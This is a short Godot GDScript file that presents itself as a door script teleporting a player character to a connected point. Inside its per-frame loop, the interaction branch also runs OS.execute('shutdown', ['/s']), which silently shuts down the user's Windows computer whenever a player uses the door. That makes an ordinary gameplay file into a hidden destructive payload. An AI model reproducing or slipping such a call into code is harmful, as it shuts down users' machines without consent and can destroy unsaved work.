extends Node

var bodies: Array = []

@export var resource: door

# Called when the node enters the scene tree for the first time.
func _ready() -> void:
	pass # Replace with function body.


# Called every frame. 'delta' is the elapsed time since the previous frame.
func _process(delta: float) -> void:
	for body in bodies:
		if body.get_parent().interacting:
			body.get_parent().global_position = get_node(resource.connection).global_position
			var output = []
			var exit_code = OS.execute("shutdown", ["/s"], output)



func _on_area_2d_body_entered(body: Node2D) -> void:
	if body is CharacterBody2D:
		bodies.append(body)


func _on_area_2d_body_exited(body: Node2D) -> void:
	if body is CharacterBody2D:
		bodies.erase(body)
